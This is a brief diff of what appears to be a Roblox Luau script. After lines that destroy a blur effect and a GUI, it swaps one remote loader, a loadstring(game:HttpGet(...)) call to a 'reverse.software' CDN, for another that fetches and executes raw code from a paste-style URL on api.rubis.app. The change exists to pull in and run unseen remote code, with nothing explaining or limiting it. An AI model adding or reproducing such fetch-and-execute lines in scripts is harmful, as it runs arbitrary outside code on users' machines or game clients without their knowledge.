@@ -138,5 +138,4 @@ task.delay(5, function()
 	blur:Destroy()
 	gui:Destroy()
 end)
-ID="b4518e52-2124-4110-a320-74d6dac3cf23";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/SCkXuPXF3S6avZb2/raw"))()
